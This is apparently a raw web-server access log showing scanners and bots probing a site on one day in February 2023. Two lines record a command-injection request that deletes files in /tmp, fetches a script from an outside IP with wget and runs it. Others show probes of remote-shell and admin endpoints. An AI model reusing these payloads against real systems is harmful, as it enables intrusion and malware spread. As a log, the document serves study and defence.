193.32.162.159 - - [04/Feb/2023:13:29:34 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
128.14.141.34 - - [04/Feb/2023:13:41:01 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
128.14.141.34 - - [04/Feb/2023:13:41:02 -0600] "HEAD /icons/sphere1.png HTTP/1.1" 301 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
193.32.162.159 - - [04/Feb/2023:13:47:09 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [04/Feb/2023:14:08:43 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
66.240.205.34 - - [04/Feb/2023:14:28:05 -0600] "Gh0st\xad" 400 226 "-" "-"
67.247.3.229 - - [04/Feb/2023:14:35:39 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.12.253.180/jaws;sh+/tmp/jaws HTTP/1.1" 301 300 "-" "Hello, world"
45.227.254.55 - - [04/Feb/2023:14:50:38 -0600] "\x03" 400 226 "-" "-"
45.227.254.55 - - [04/Feb/2023:14:50:38 -0600] "\x03" 400 226 "-" "-"
143.110.222.166 - - [04/Feb/2023:15:04:42 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
114.119.165.226 - - [04/Feb/2023:15:35:19 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
162.243.148.20 - - [04/Feb/2023:15:46:59 -0600] "GET /hudson HTTP/1.1" 301 247 "-" "Mozilla/5.0 zgrab/0.x"
197.237.49.113 - - [04/Feb/2023:16:04:21 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+45.12.253.180/jaws;sh+/tmp/jaws HTTP/1.1" 301 300 "-" "Hello, world"
143.110.222.166 - - [04/Feb/2023:16:04:53 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
193.32.162.159 - - [04/Feb/2023:16:08:20 -0600] "GET /config/getuser?index=0 HTTP/1.1" 301 263 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
185.180.143.140 - - [04/Feb/2023:16:32:00 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.180.143.140 - - [04/Feb/2023:16:32:02 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
168.63.248.131 - - [04/Feb/2023:16:32:04 -0600] "POST /mgmt/tm/util/bash HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
168.63.248.131 - - [04/Feb/2023:16:32:04 -0600] "GET / HTTP/1.1" 301 241 "-" "curl/7.58.0"
185.180.143.140 - - [04/Feb/2023:16:32:13 -0600] "GET /admin/ HTTP/1.1" 301 247 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.180.143.140 - - [04/Feb/2023:16:32:13 -0600] "GET /webfig/ HTTP/1.1" 301 248 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.180.143.140 - - [04/Feb/2023:16:32:25 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.180.143.140 - - [04/Feb/2023:16:32:25 -0600] "GET /solr/ HTTP/1.1" 301 246 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
